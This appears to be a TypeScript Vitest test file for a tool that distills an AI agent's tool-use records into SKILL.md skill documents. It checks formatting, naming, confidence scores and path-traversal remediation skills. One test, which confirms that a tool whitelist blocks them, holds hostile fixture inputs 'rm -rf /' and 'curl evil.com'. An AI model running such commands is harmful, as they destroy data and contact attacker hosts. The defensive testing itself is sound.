import { describe, it, expect } from 'vitest';
import yaml from 'js-yaml';
import {
  WorkflowSkillDistiller,
  DistilledSkill,
  DistillationOptions,
} from '../skill-distiller.js';
import {
  SkillTemplateGenerator,
  generateSkillMarkdown,
  SkillTemplateData,
} from '../templates.js';
import { ExperienceRecord, ExecutionStep, QuorumFeedback, RemediationPair } from '../types.js';
import { SkillDogmaValidator } from '../dogma-validator.js';
import { ReflectiveInvariantSynthesizer } from '../invariant-synthesizer.js';

function assertDefined<T>(val: T | null | undefined): asserts val is T {
  expect(val).toBeDefined();
  expect(val).not.toBeNull();
  if (val === null || val === undefined) {
    throw new Error('Value must be defined');
  }
}

describe('WorkflowSkillDistiller & SkillTemplateGenerator', () => {
  const sampleSuccessRecord: ExperienceRecord = {
    id: 'exp-101',
    trackId: 'docker_fastmcp_integration_20260906',
    timestamp: 1725642000000,
    goal: 'Implement Docker FastMCP Integration',
    tags: ['docker', 'fastmcp', 'mcp'],
    outcome: 'success',
    steps: [
      {
        stepIndex: 1,
        tool: 'write_to_file',
        input: { TargetFile: '/app/docker-compose.yml', toolSummary: 'Write Docker compose config' },
        output: { success: true },
        status: 'success',
      },
      {
        stepIndex: 2,
        tool: 'run_command',
        input: { CommandLine: 'docker compose up -d', toolSummary: 'Launch containers' },
        output: { exitCode: 0 },
        status: 'success',
      },
      {
        stepIndex: 3,
        tool: 'run_command',
        input: { CommandLine: 'npm test -- --run', toolSummary: 'Run test suite' },
        output: { exitCode: 0 },
        status: 'success',
      },
    ],
    quorumReviews: [
      {
        reviewerRole: 'security-reviewer',
        verdict: 'RESOLVED',
        findings: [],
      },
      {
        reviewerRole: 'correctness-reviewer',
        verdict: 'RESOLVED',
        findings: [],
      },
    ],
  };

  describe('Invariant: YAML frontmatter with name and description', () => {
    it('produces valid SKILL.md document with parseable YAML frontmatter containing name and description', () => {
      const distilled = WorkflowSkillDistiller.distillFromExperience(sampleSuccessRecord);
      assertDefined(distilled);

      expect(distilled.name).toBe('docker-fastmcp-integration');
      expect(distilled.sourceTrackId).toBe('docker_fastmcp_integration_20260906');
      expect(typeof distilled.description).toBe('string');
      expect(distilled.description.length).toBeGreaterThan(0);

      // Invariant check: Document MUST have valid YAML frontmatter with name & description
      const content = distilled.content;
      expect(content.startsWith('---')).toBe(true);

      const parts = content.split(/^---$/m);
      expect(parts.length).toBeGreaterThanOrEqual(3);

      const rawYaml = parts[1];
      const parsed = yaml.load(rawYaml) as Record<string, any>;

      expect(parsed).toBeDefined();
      expect(parsed.name).toBe('docker-fastmcp-integration');
      expect(parsed.description).toBeDefined();
      expect(typeof parsed.description).toBe('string');
      expect(parsed.description.length).toBeGreaterThan(0);

      // Verify superconductor_learning metadata schema
      expect(parsed.superconductor_learning).toBeDefined();
      expect(parsed.superconductor_learning.status).toBe('incubating');
      expect(parsed.superconductor_learning.source_track).toBe('docker_fastmcp_integration_20260906');
      expect(parsed.superconductor_learning.vetting_status).toBe('pending');
      expect(typeof parsed.superconductor_learning.confidence_score).toBe('number');
      expect(typeof parsed.superconductor_learning.harvest_timestamp).toBe('string');
    });

    it('handles special characters and colons in descriptions without corrupting YAML syntax', () => {
      const customRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: 'Fix: handle "special" characters & colons: in descriptions [critical]',
      };

      const distilled = WorkflowSkillDistiller.distillFromExperience(customRecord);
      assertDefined(distilled);

      const parts = distilled.content.split(/^---$/m);
      const parsed = yaml.load(parts[1]) as Record<string, any>;
      expect(parsed.description).toContain('special');
      expect(parsed.description).toContain('colons:');
    });
  });

  describe('Standard Markdown Sections', () => {
    it('formats all required sections: Title, Overview, When to Use, Workflow & Procedure, Guidelines & Invariants, Verification', () => {
      const distilled = WorkflowSkillDistiller.distillFromExperience(sampleSuccessRecord);
      assertDefined(distilled);
      const content = distilled.content;

      // Top-level skill heading
      expect(content).toMatch(/^# /m);
      expect(content).toContain(`# ${distilled.name}`);

      // All standard section headings
      expect(content).toContain('## Overview');
      expect(content).toContain('## When to Use');
      expect(content).toContain('## Workflow & Procedure');
      expect(content).toContain('## Guidelines & Invariants');
      expect(content).toContain('## Verification');
    });

    it('populates Workflow & Procedure from execution steps', () => {
      const distilled = WorkflowSkillDistiller.distillFromExperience(sampleSuccessRecord);
      assertDefined(distilled);
      const content = distilled.content;

      expect(content).toContain('write_to_file');
      expect(content).toContain('docker compose up -d');
      expect(content).toContain('docker-compose.yml');
    });

    it('populates Guidelines & Invariants from quorum feedback or repository dogma', () => {
      const recordWithFindings: ExperienceRecord = {
        ...sampleSuccessRecord,
        quorumReviews: [
          {
            reviewerRole: 'security-reviewer',
            verdict: 'RESOLVED',
            findings: ['MUST NOT expose raw docker socket to unprivileged containers'],
          },
        ],
      };

      const distilled = WorkflowSkillDistiller.distillFromExperience(recordWithFindings);
      assertDefined(distilled);
      const content = distilled.content;

      expect(content).toContain('MUST NOT expose raw docker socket');
    });

    it('populates Verification from test execution steps when available', () => {
      const distilled = WorkflowSkillDistiller.distillFromExperience(sampleSuccessRecord);
      assertDefined(distilled);
      const content = distilled.content;

      expect(content).toContain('npm test -- --run');
    });
  });

  describe('Discarding trivial or failed experience traces', () => {
    it('discards records with outcome === "failure" by default', () => {
      const failedRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        outcome: 'failure',
      };

      const result = WorkflowSkillDistiller.distillFromExperience(failedRecord);
      expect(result).toBeNull();
    });

    it('allows failed records when allowFailure or allowFailed option is enabled', () => {
      const failedRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        outcome: 'failure',
      };

      const result1 = WorkflowSkillDistiller.distillFromExperience(failedRecord, { allowFailure: true });
      expect(result1).not.toBeNull();

      const result2 = WorkflowSkillDistiller.distillFromExperience(failedRecord, { allowFailed: true });
      expect(result2).not.toBeNull();
    });

    it('discards trivial records with < 2 steps by default', () => {
      const emptyStepsRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        steps: [],
      };
      expect(WorkflowSkillDistiller.distillFromExperience(emptyStepsRecord)).toBeNull();

      const singleStepRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        steps: [sampleSuccessRecord.steps[0]],
      };
      expect(WorkflowSkillDistiller.distillFromExperience(singleStepRecord)).toBeNull();
    });

    it('allows trivial records when allowTrivial or minSteps option is specified', () => {
      const singleStepRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        steps: [sampleSuccessRecord.steps[0]],
      };

      const resultTrivial = WorkflowSkillDistiller.distillFromExperience(singleStepRecord, { allowTrivial: true });
      expect(resultTrivial).not.toBeNull();

      const resultMinSteps = WorkflowSkillDistiller.distillFromExperience(singleStepRecord, { minSteps: 1 });
      expect(resultMinSteps).not.toBeNull();
    });

    it('discards records below minConfidence threshold', () => {
      const result = WorkflowSkillDistiller.distillFromExperience(sampleSuccessRecord, { minConfidence: 0.99 });
      // If sample record confidence is around 0.85-0.95, threshold 0.99 will discard it
      expect(result).toBeNull();
    });

    it('returns null gracefully for invalid or empty input records', () => {
      expect(WorkflowSkillDistiller.distillFromExperience(null as any)).toBeNull();
      expect(WorkflowSkillDistiller.distillFromExperience(undefined as any)).toBeNull();
    });
  });

  describe('Formulating kebab-case skill names', () => {
    it('formulates kebab-case name from goal', () => {
      const record1: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: 'Service worker cache sync',
      };
      const result1 = WorkflowSkillDistiller.distillFromExperience(record1);
      expect(result1?.name).toBe('service-worker-cache-sync');

      const record2: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: 'Docker FastMCP Integration',
      };
      const result2 = WorkflowSkillDistiller.distillFromExperience(record2);
      expect(result2?.name).toBe('docker-fastmcp-integration');
    });

    it('strips common task prefixes like "Task: Implement ..."', () => {
      const record: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: 'Task: Implement service-worker-cache-sync',
      };
      const result = WorkflowSkillDistiller.distillFromExperience(record);
      expect(result?.name).toBe('service-worker-cache-sync');
    });

    it('falls back to trackId when goal is missing or generic', () => {
      const record: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: '',
        trackId: 'docker_fastmcp_integration_20260906',
      };
      const result = WorkflowSkillDistiller.distillFromExperience(record);
      expect(result?.name).toBe('docker-fastmcp-integration');
    });

    it('honors explicit skillName option', () => {
      const result = WorkflowSkillDistiller.distillFromExperience(sampleSuccessRecord, {
        skillName: 'custom-orchestration-workflow',
      });
      expect(result?.name).toBe('custom-orchestration-workflow');
    });

    it('sanitizes record.id through toKebabCase in fallback when goal and trackId are absent (ADV-3)', () => {
      const record1: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: '',
        trackId: '',
        id: 'Exp Record #42 / Critical!',
      };
      const result1 = WorkflowSkillDistiller.distillFromExperience(record1);
      expect(result1?.name).toBe('workflow-skill-exp-record-42-critical');

      const record2: ExperienceRecord = {
        ...sampleSuccessRecord,
        goal: '',
        trackId: '',
        id: '$$$###',
      };
      const result2 = WorkflowSkillDistiller.distillFromExperience(record2);
      expect(result2?.name).toBe('workflow-skill-unnamed');
    });
  });

  describe('Confidence Score Heuristics', () => {
    it('computes confidence score between 0.0 and 1.0', () => {
      const score = WorkflowSkillDistiller.computeConfidenceScore(sampleSuccessRecord);
      expect(score).toBeGreaterThanOrEqual(0.0);
      expect(score).toBeLessThanOrEqual(1.0);
    });

    it('assigns higher confidence to records with successful quorum and multiple steps', () => {
      const cleanRecordScore = WorkflowSkillDistiller.computeConfidenceScore(sampleSuccessRecord);

      const flawedRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        steps: [
          sampleSuccessRecord.steps[0],
          {
            stepIndex: 2,
            tool: 'run_command',
            input: {},
            output: {},
            status: 'error',
          },
        ],
        quorumReviews: [
          {
            reviewerRole: 'correctness-reviewer',
            verdict: 'NEEDS_FIXES',
            findings: ['Logic error in parameter handling'],
          },
        ],
      };

      const flawedRecordScore = WorkflowSkillDistiller.computeConfidenceScore(flawedRecord);
      expect(cleanRecordScore).toBeGreaterThan(flawedRecordScore);
    });

    it('assigns lower confidence to failed outcomes even when allowed via options', () => {
      const failedRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        outcome: 'failure',
      };

      const failedScore = WorkflowSkillDistiller.computeConfidenceScore(failedRecord);
      const successScore = WorkflowSkillDistiller.computeConfidenceScore(sampleSuccessRecord);

      expect(failedScore).toBeLessThan(successScore);
      expect(failedScore).toBeLessThan(0.5);
    });
  });

  describe('SkillTemplateGenerator standalone usage', () => {
    it('generates markdown matching SkillTemplateData specifications', () => {
      const data: SkillTemplateData = {
        name: 'test-custom-skill',
        description: 'A custom standalone skill template test.',
        sourceTrackId: 'test_track_1',
        harvestTimestamp: '2026-09-06T12:00:00.000Z',
        confidenceScore: 0.92,
        title: 'Test Custom Skill',
        overview: 'Custom overview content.',
        whenToUse: ['Condition 1', 'Condition 2'],
        workflowProcedure: ['Step 1: Do A', 'Step 2: Do B'],
        guidelinesInvariants: ['Must obey rule X'],
        verification: ['Run verification Y'],
      };

      const markdown = SkillTemplateGenerator.render(data);

      expect(markdown).toContain('name: test-custom-skill');
      expect(markdown).toContain('confidence_score: 0.92');
      expect(markdown).toContain('# Test Custom Skill');
      expect(markdown).toContain('## Overview');
      expect(markdown).toContain('Custom overview content.');
      expect(markdown).toContain('## When to Use');
      expect(markdown).toContain('Condition 1');
      expect(markdown).toContain('## Workflow & Procedure');
      expect(markdown).toContain('Step 1: Do A');
      expect(markdown).toContain('## Guidelines & Invariants');
      expect(markdown).toContain('Must obey rule X');
      expect(markdown).toContain('## Verification');
      expect(markdown).toContain('Run verification Y');

      // Check helper export
      const markdown2 = generateSkillMarkdown(data);
      expect(markdown2).toBe(markdown);
    });
  });

  describe('Remediation Micro-Skill Distillation', () => {
    const sampleRemediationPair: RemediationPair = {
      id: 'rem-path-traversal',
      domain: 'security',
      finding: 'Path traversal vulnerability in static file handler allowing arbitrary read',
      errorSummary: 'AssertionError: expected path /etc/passwd to be contained within sandbox root',
      failureStep: {
        stepIndex: 4,
        tool: 'run_command',
        input: { CommandLine: 'npm test -- --run src/__tests__/server.test.ts' },
        output: 'AssertionError: expected path /etc/passwd to be contained within sandbox root\n at testTraversal (/test/server.test.ts:42)',
        status: 'error',
      },
      resolutionSteps: [
        {
          stepIndex: 5,
          tool: 'view_file',
          input: { AbsolutePath: '/app/src/server.ts', toolSummary: 'Inspect static file handler' },
          output: { content: 'function resolvePath(p) { return path.join(root, p); }' },
          status: 'success',
        },
        {
          stepIndex: 6,
          tool: 'replace_file_content',
          input: {
            TargetFile: '/app/src/server.ts',
            toolSummary: 'Contain path within root boundary',
            TargetContent: 'return path.join(root, p);',
            ReplacementContent: 'const safe = path.resolve(root, p); if (!safe.startsWith(root)) throw new Error("Path traversal"); return safe;',
          },
          output: { success: true },
          status: 'success',
        },
        {
          stepIndex: 7,
          tool: 'run_command',
          input: { CommandLine: 'npm test -- --run src/__tests__/server.test.ts', toolSummary: 'Verify path containment' },
          output: { exitCode: 0, stdout: 'All tests passed (12/12)' },
          status: 'success',
        },
      ],
      diffHunk: '--- a/src/server.ts\n+++ b/src/server.ts\n@@ -10,1 +10,3 @@\n- return path.join(root, p);\n+ const safe = path.resolve(root, p);\n+ if (!safe.startsWith(root)) throw new Error("Path traversal");\n+ return safe;',
    };

    const sampleRemediationRecord: ExperienceRecord = {
      id: 'exp-remediation-101',
      trackId: 'secure_sandbox_hardening_20260906',
      timestamp: 1725643000000,
      goal: 'Harden static file server against traversal attacks',
      outcome: 'success',
      tags: ['security', 'sandbox', 'containment'],
      steps: [
        ...sampleSuccessRecord.steps,
        sampleRemediationPair.failureStep!,
        ...sampleRemediationPair.resolutionSteps,
      ],
      quorumReviews: [
        {
          reviewerRole: 'security-reviewer',
          verdict: 'RESOLVED',
          findings: ['The file server MUST contain all requested paths within the sandbox root'],
        },
      ],
      remediationPairs: [sampleRemediationPair],
    };

    it('distills a RemediationPair into a contrastive micro-skill with Anti-Patterns and Hardened Patterns', () => {
      const microSkills = WorkflowSkillDistiller.distillRemediationMicroSkills(sampleRemediationRecord);
      expect(microSkills).toHaveLength(1);

      const skill = microSkills[0];
      expect(skill.name).toBe('path-traversal-containment');
      expect(skill.sourceTrackId).toBe('secure_sandbox_hardening_20260906');
      expect(skill.confidenceScore).toBeGreaterThanOrEqual(0.85);
      expect(skill.tags).toContain('micro-skill');
      expect(skill.tags).toContain('remediation');
      expect(skill.tags).toContain('security');

      const content = skill.content;
      assertDefined(content);

      // Contrastive headings check
      expect(content).toContain('## Anti-Patterns & Common Traps (Where Things Go Wrong)');
      expect(content).toContain('## Hardened Implementation Pattern (Where Things Go Right)');
      expect(content).toContain('## Workflow & Procedure');
      expect(content).toContain('## Invariants & Rules');
      expect(content).toContain('## Verification Recipe');

      // Failure and hardened content check
      expect(content).toContain('Path traversal vulnerability');
      expect(content).toContain('AssertionError: expected path /etc/passwd');
      expect(content).toContain('Surgically hardened targets: `/app/src/server.ts`');

      // Dogma validation check: MUST pass static analysis and dogma rules
      const report = SkillDogmaValidator.validate(content);
      expect(report.valid).toBe(true);
      expect(report.status).toBe('passed');
      expect(report.violations.filter(v => v.severity === 'error')).toHaveLength(0);
    });

    it('enforces invariant: procedural steps in micro-skills MUST NOT exceed 15 steps', () => {
      // Create a pair with 25 resolution steps
      const manyResolutionSteps: ExecutionStep[] = [];
      for (let i = 1; i <= 25; i++) {
        manyResolutionSteps.push({
          stepIndex: 10 + i,
          tool: i % 2 === 0 ? 'view_file' : 'run_command',
          input: i % 2 === 0
            ? { AbsolutePath: `/app/src/module_${i}.ts`, toolSummary: `Inspect module ${i}` }
            : { CommandLine: `echo "step ${i}"`, toolSummary: `Step command ${i}` },
          output: { success: true },
          status: 'success',
        });
      }

      const bloatedPair: RemediationPair = {
        ...sampleRemediationPair,
        id: 'rem-bloated-steps',
        resolutionSteps: manyResolutionSteps,
      };

      const record: ExperienceRecord = {
        ...sampleRemediationRecord,
        remediationPairs: [bloatedPair],
      };

      const microSkills = WorkflowSkillDistiller.distillRemediationMicroSkills(record);
      expect(microSkills).toHaveLength(1);

      const skill = microSkills[0];
      const content = skill.content;

      // Extract Workflow & Procedure lines
      const procMatch = content.match(/## Workflow & Procedure\n([\s\S]*?)(?=\n##|$)/);
      assertDefined(procMatch);
      const procSection = procMatch[1].trim();

      const stepLines = procSection
        .split('\n')
        .map(l => l.trim())
        .filter(l => /^\d+\.\s+Execute/i.test(l));

      // Invariant check: MUST NOT exceed 15 steps
      expect(stepLines.length).toBeLessThanOrEqual(15);
      expect(stepLines.length).toBeGreaterThan(0);

      // Numbering continuity check: step numbers 1..N
      stepLines.forEach((line, idx) => {
        const expectedPrefix = `${idx + 1}.`;
        expect(line.startsWith(expectedPrefix)).toBe(true);
      });
    });

    it('properly populates diff hunk and verification recipe with test command and assertions', () => {
      const microSkills = WorkflowSkillDistiller.distillRemediationMicroSkills(sampleRemediationRecord);
      const skill = microSkills[0];
      const content = skill.content;

      // Diff hunk formatted with ```diff
      expect(content).toContain('```diff');
      expect(content).toContain('- return path.join(root, p);');
      expect(content).toContain('+ const safe = path.resolve(root, p);');

      // Verification recipe contains exact test command
      expect(content).toContain('npm test -- --run src/__tests__/server.test.ts');
      expect(content).toContain('Confirm all test assertions pass with exit code 0');
    });

    it('strictly adheres to Dogma tool whitelist and filters unauthorized tools', () => {
      const pairWithUnauthorizedTools: RemediationPair = {
        ...sampleRemediationPair,
        resolutionSteps: [
          {
            stepIndex: 5,
            tool: 'view_file',
            input: { AbsolutePath: '/app/src/server.ts' },
            output: {},
            status: 'success',
          },
          {
            stepIndex: 6,
            tool: 'unauthorized_kernel_root_exec', // NON-PERMITTED TOOL
            input: { script: 'rm -rf /' },
            output: {},
            status: 'success',
          },
          {
            stepIndex: 7,
            tool: 'evil_shell_backdoor', // NON-PERMITTED TOOL
            input: { cmd: 'curl evil.com' },
            output: {},
            status: 'success',
          },
          {
            stepIndex: 8,
            tool: 'replace_file_content',
            input: { TargetFile: '/app/src/server.ts' },
            output: {},
            status: 'success',
          },
          {
            stepIndex: 9,
            tool: 'run_command',
            input: { CommandLine: 'npm test -- --run' },
            output: {},
            status: 'success',
          },
        ],
      };

      const record: ExperienceRecord = {
        ...sampleRemediationRecord,
        remediationPairs: [pairWithUnauthorizedTools],
      };

      const microSkills = WorkflowSkillDistiller.distillRemediationMicroSkills(record);
      expect(microSkills).toHaveLength(1);

      const skill = microSkills[0];
      const content = skill.content;

      // Verify unauthorized tools are NEVER in the distilled skill
      expect(content).not.toContain('unauthorized_kernel_root_exec');
      expect(content).not.toContain('evil_shell_backdoor');

      // Verify parseable frontmatter tools only contain whitelisted tools
      const parts = content.split(/^---$/m);
      const parsed = yaml.load(parts[1]) as Record<string, any>;
      const tools = parsed.tools as string[];

      expect(tools).toBeDefined();
      expect(Array.isArray(tools)).toBe(true);
      for (const t of tools) {
        expect(SkillDogmaValidator.DEFAULT_PERMITTED_TOOLS.has(t)).toBe(true);
      }

      // Verify Dogma validation has zero tool-whitelist errors
      const report = SkillDogmaValidator.validate(content, { rejectOnUnknownTools: true });
      expect(report.violations.filter(v => v.rule === 'tool-whitelist' || v.rule === 'invalid-tool-name')).toHaveLength(0);
    });

    it('derives clean, concise kebab-case micro-skill names for canonical patterns', () => {
      // 1. Path traversal
      const name1 = WorkflowSkillDistiller.deriveRemediationSkillName({
        id: '1',
        finding: 'Path traversal vulnerability in static server',
        errorSummary: 'path traversal',
        resolutionSteps: [],
      });
      expect(name1).toBe('path-traversal-containment');

      // 2. Shell pattern regex hardening
      const name2 = WorkflowSkillDistiller.deriveRemediationSkillName({
        id: '2',
        finding: 'Prohibited shell pattern regex bypass in validator',
        errorSummary: 'shell pattern regex hardening',
        resolutionSteps: [],
      });
      expect(name2).toBe('shell-pattern-regex-hardening');

      // 3. Canary sandbox isolation
      const name3 = WorkflowSkillDistiller.deriveRemediationSkillName({
        id: '3',
        finding: 'Canary sandbox isolation failure during test execution',
        errorSummary: 'sandbox escape',
        resolutionSteps: [],
      });
      expect(name3).toBe('canary-sandbox-isolation');

      // 4. SQL injection
      const name4 = WorkflowSkillDistiller.deriveRemediationSkillName({
        id: '4',
        finding: 'SQL injection vulnerability in query builder',
        errorSummary: 'sql injection',
        resolutionSteps: [],
      });
      expect(name4).toBe('sql-injection-prevention');

      // 5. Explicit skillName option
      const name5 = WorkflowSkillDistiller.deriveRemediationSkillName(
        { id: '5', errorSummary: 'misc error', resolutionSteps: [] },
        undefined,
        { skillName: 'Custom Hardened Workflow' }
      );
      expect(name5).toBe('custom-hardened-workflow');
    });

    it('synthesizes RFC-2119 invariants rules via ReflectiveInvariantSynthesizer', () => {
      const microSkills = WorkflowSkillDistiller.distillRemediationMicroSkills(sampleRemediationRecord);
      const skill = microSkills[0];
      const content = skill.content;

      // Extract Invariants & Rules section
      const invMatch = content.match(/## Invariants & Rules\n([\s\S]*?)(?=\n##|$)/);
      assertDefined(invMatch);
      const invSection = invMatch[1].trim();

      const ruleLines = invSection
        .split('\n')
        .map(l => l.replace(/^[-*]\s+/, '').trim())
        .filter(Boolean);

      expect(ruleLines.length).toBeGreaterThan(0);

      // Invariant check: MUST contain RFC-2119 keywords
      for (const rule of ruleLines) {
        expect(/\b(MUST|MUST NOT)\b/.test(rule)).toBe(true);
        expect(ReflectiveInvariantSynthesizer.isValidInvariant(rule)).toBe(true);
      }
    });

    it('supports distillRemediations option in distillFromExperience', () => {
      // 1. With distillRemediations: true -> returns micro-skill
      const microResult = WorkflowSkillDistiller.distillFromExperience(sampleRemediationRecord, {
        distillRemediations: true,
      });
      assertDefined(microResult);
      expect(microResult.name).toBe('path-traversal-containment');
      expect(microResult.content).toContain('## Hardened Implementation Pattern');

      // 2. With distillRemediations: false -> returns standard track skill
      const trackResult = WorkflowSkillDistiller.distillFromExperience(sampleRemediationRecord, {
        distillRemediations: false,
      });
      assertDefined(trackResult);
      expect(trackResult.name).toBe('harden-static-file-server-against-traversal-attacks');
      expect(trackResult.content).toContain('## Guidelines & Invariants');
      expect(trackResult.content).not.toContain('## Hardened Implementation Pattern');
    });

    it('condenses track steps when steps > 20 for general track distillation', () => {
      // Generate 32 steps
      const manySteps: ExecutionStep[] = [];
      for (let i = 1; i <= 32; i++) {
        const isEdit = i % 5 === 0;
        manySteps.push({
          stepIndex: i,
          tool: isEdit ? 'replace_file_content' : 'view_file',
          input: {
            TargetFile: `/app/src/file_${i}.ts`,
            AbsolutePath: `/app/src/file_${i}.ts`,
            toolSummary: `Step ${i}`,
          },
          output: { success: true },
          status: 'success',
        });
      }

      const bloatedTrackRecord: ExperienceRecord = {
        ...sampleSuccessRecord,
        steps: manySteps,
      };

      // When maxSteps is omitted, defaults to condensing to 20 steps
      const distilledDefault = WorkflowSkillDistiller.distillFromExperience(bloatedTrackRecord);
      assertDefined(distilledDefault);

      const defaultProcMatch = distilledDefault.content.match(/## Workflow & Procedure\n([\s\S]*?)(?=\n##|$)/);
      assertDefined(defaultProcMatch);
      const defaultLines = defaultProcMatch[1]
        .split('\n')
        .map(l => l.trim())
        .filter(l => /^\d+\.\s+Execute/i.test(l));

      expect(defaultLines.length).toBeLessThanOrEqual(20);

      // When maxSteps: 25 is explicitly provided, it honors the override
      const distilledCustom = WorkflowSkillDistiller.distillFromExperience(bloatedTrackRecord, {
        maxSteps: 25,
      });
      assertDefined(distilledCustom);

      const customProcMatch = distilledCustom.content.match(/## Workflow & Procedure\n([\s\S]*?)(?=\n##|$)/);
      assertDefined(customProcMatch);
      const customLines = customProcMatch[1]
        .split('\n')
        .map(l => l.trim())
        .filter(l => /^\d+\.\s+Execute/i.test(l));

      expect(customLines.length).toBeLessThanOrEqual(25);
    });
  });
});

